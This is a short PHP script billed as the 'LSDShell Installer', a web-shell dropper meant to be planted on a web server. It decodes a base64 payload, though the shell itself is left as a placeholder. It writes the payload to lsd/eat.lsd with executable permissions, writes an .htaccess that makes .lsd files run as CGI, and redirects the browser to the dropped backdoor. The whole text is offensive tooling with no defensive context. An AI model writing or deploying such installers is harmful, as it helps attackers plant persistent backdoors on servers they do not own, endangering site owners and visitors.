$lsd = "REPLACE ME WITH BASE64 ENCODED LSDSHELL"
$hta = <<< EOHTA
AddHandler cgi-script .lsd
Options +ExecCGI
EOHTA;
mkdir("lsd");
echo '<html><h1><center>LSDShell Installer</center></h1><br>[+] Extracting LSDShell...<br>';
$lsd = base64_decode($lsd);
$f = fopen("lsd/eat.lsd", "w"); fwrite($f, $lsd); fclose($f);
chmod("lsd/eat.lsd", 0755);
echo '[+] Writing .htaccess...<br>';
$f = fopen("lsd/.htaccess", "w"); fwrite($f, $hta); fclose($f);
echo "Done! <script> document.location = 'lsd/eat.lsd' </script>"?>

